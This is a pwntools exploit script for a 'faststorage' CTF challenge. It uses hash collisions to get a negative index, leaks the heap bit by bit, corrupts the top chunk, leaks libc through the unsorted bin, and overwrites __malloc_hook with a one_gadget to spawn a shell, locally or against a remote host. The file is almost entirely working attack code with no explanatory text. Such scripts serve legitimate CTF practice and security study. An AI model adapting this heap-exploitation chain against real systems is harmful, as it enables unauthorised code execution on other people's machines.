from pwn import *

g_local=True
context.log_level='debug'

ONE_GADGET_OFF =[0x45216,0x4526a,0xf02a4,0xf1147]
UNSORTED_OFF = 0x3c4b78
e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
if g_local:
    sh = process('./faststorage')#env={'LD_PRELOAD':'./libc.so.6'}
    #gdb.attach(sh)
else:
    sh = remote("faststorage.hackable.software", 1337)

xor_add_60 = {
6:0xd2c,
10:0x10ede,
11:0x1396f,
12:0x177ad,
8:0x18563,
7:0x3962,
13:0x33b7b,
14:0x3b77b,
5:0x58021,
16:0xbafef,
17:0xbffdb,
15:0xdcbef,
19:0x3d7fef,
18:0x4d77ff,
21:0xfd7fef,
20:0xff3bfd,
22:0x1f6fdff,
23:0x3fefefe,
26:0xff0105bfff,
24:0xff01071eff,
25:0xff01073fdf,
27:0xff011fdfdd,
28:0xff011fdffb,
29:0xff017fcfbf,
31:0xff03f77dff,
30:0xff03f77fcf
}

xor_add_61 = {7:0x00094f,
11:0x001e7f,
10:0x00279f,
6:0x00720a,
8:0x009167,
4:0x00c204,
9:0x00ee86,
12:0x023b7b,
13:0x025eef,
15:0x06a7ff,
14:0x0adbaf,
16:0x0bfbfa,
5:0x4080a2,
0:0xff0ffb7fde,
3:0xff17fffffe,
1:0xff1def7ffe,
2:0xff1fbfffde}

def add(name, size, value):
    sh.send("1\n")
    sh.recvuntil("Name: ")
    sh.send(name)
    sh.recvuntil("Size: ")
    sh.send(str(size) + "\n")
    sh.recvuntil("Value: ")
    sh.send(value)
    sh.recvuntil("> ")

def printe(name):
    sh.send("2\n")
    sh.recvuntil("Name: ")
    sh.send(name)
    sh.recvuntil("Value: ")
    ret = sh.recvuntil("\n")
    sh.recvuntil("> ")
    return ret[:len(ret)-1]

def edit(name, value):
    sh.send("3\n")
    sh.recvuntil("Name: ")
    sh.send(name)
    sh.recvuntil("Value: ")
    sh.send(value)
    sh.recvuntil("> ")

def printsc(name):
    sh.send("2\n")
    sh.recvuntil("Name: ")
    sh.send(name)
    ret = sh.recvuntil("> ")
    return ret.find("No such entry!") == -1


int_min_hash = p64(0xa9e6f8a1)
#give -2, way to brute force this is quite easy.

for i in xrange(12,32):
    add(p64(xor_add_60[i]), 0x10, "no null pointer")
for i in xrange(0,16):
    add(p64(xor_add_61[i]), 0x10, "no null pointer")

add(int_min_hash, 0x10, "-2 idx access")

heap_addr = 0
for i in xrange(12,32):
    if printsc(p64(xor_add_60[i])):
        heap_addr |= (1 << i)

for i in xrange(0,16):
    if printsc(p64(xor_add_61[i])):
        heap_addr |= (1 << (i + 32))

log.info("heap_addr:%#x",heap_addr) 

neg2_name_off = 0xdb0
top_off = 0x1090



#will allocate at df0
fakeent = p64(0)
fakeent += p64(heap_addr + neg2_name_off)
fakeent += p64((heap_addr + top_off + 8) | (8 << 0x30))
add("fakeent\x00", 0x200, fakeent)
add(p64(xor_add_60[5]), 0x10, "dd0->df0")
edit(int_min_hash, p64(0xf71))

#now topchunk
# 0x555555758090 PREV_INUSE {
#   size = 3953 = 0xf71
for i in xrange(0,4):
    add("consume\x00", 0x400, "topchunk")

#get a 0x221 unsorted bin
add("leaklibc\x00", 0x100, "leakleak")
leak = printe("leaklibc\x00")
libc_addr = u64(leak[8:0x10]) - UNSORTED_OFF
log.info("libc_addr:%#x",libc_addr)

add("consume", 0x80, "whole unsorted bin")
add(int_min_hash, 0x10, "-2 idx access")


fakeent = p64(0)
fakeent += p64(heap_addr + neg2_name_off)
fakeent += p64((libc_addr + e.symbols["__malloc_hook"]) | (8 << 0x30))
#0x21460 off for this
add(p64(xor_add_60[7]), 0x100, 'a'*96+fakeent)
#460->4e0

edit(int_min_hash, p64(libc_addr + ONE_GADGET_OFF[1]))
#__malloc_hook = one_gadget

sh.send("1\n")
sh.recvuntil("Name: ")
sh.send("final")
sh.recvuntil("Size: ")
sh.send("100" + "\n")
sh.interactive()
